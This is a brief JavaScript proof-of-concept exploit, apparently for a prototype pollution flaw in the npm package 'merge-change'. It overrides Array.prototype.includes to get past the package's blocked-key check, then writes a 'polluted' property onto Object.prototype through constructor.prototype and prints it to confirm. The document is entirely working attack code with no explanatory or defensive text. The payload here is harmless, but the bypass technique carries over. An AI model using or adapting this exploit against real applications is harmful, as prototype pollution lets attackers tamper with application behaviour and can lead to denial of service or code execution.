Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const utils = require('merge-change').utils;
console.log({}.polluted);
let obj = {};
utils.set(obj, [
    'constructor',
    'prototype',
    'polluted'
], 'yes');
console.log({}.polluted);